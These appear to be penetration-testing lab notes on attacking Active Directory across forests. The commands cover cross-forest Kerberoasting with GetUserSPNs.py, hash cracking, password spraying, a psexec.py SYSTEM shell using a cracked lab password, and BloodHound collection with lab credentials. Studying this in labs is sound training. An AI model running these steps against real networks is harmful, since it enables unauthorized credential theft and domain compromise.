## Cross-Forest Kerberoasting

**Using GetUserSPNs.py
```
GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
```

**Using the -request Flag
```
GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
```
- hashcat mode 13100
- Search for password reuse in current domain after cracking
- Attempt single password spray with the cracked password in current domain

**System shell on the other domain
```
psexec.py FREIGHTLOGISTICS.LOCAL/sapsso@academy-ea-dc03.inlanefreight.local -target-ip 172.16.5.238
```
- Password: pabloPICASSO

## Hunting Foreign Group Membership with Bloodhound-python

If we are not connected to via DNS, we must edit resolv.conf
**Adding INLANEFREIGHT.LOCAL Information to the end of /etc/resolv.conf
```
domain INLANEFREIGHT.LOCAL
nameserver 172.16.5.5
```

**Running bloodhound-python Against INLANEFREIGHT.LOCAL
```
bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2
```

**Compressing the File with zip -r
```
zip -r ilfreight_bh.zip *.json
```

Do the same with the other domain.
**Adding FREIGHTLOGISTICS.LOCAL Information to /etc/resolv.conf
```
domain FREIGHTLOGISTICS.LOCAL
nameserver 172.16.5.238
```

**Running bloodhound-python Against FREIGHTLOGISTICS.LOCAL
```
bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2
```

**Viewing Dangerous Right through BloodHound
Analysis > Users with Foreign Domain Group Membership > INLANEFREIGHT.LOCAL

